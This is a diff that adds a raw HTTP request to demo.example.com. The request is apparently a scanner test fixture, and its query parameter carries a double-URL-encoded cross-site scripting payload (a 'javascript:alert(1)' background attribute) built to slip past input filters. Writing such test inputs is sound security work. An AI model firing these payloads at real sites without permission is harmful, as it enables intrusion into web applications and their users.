@@ -1,0 +1,4 @@
+GET /a?s=%253Ctd%2Bbackground%253Djavascript%253Aalert%25281%2529%253E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
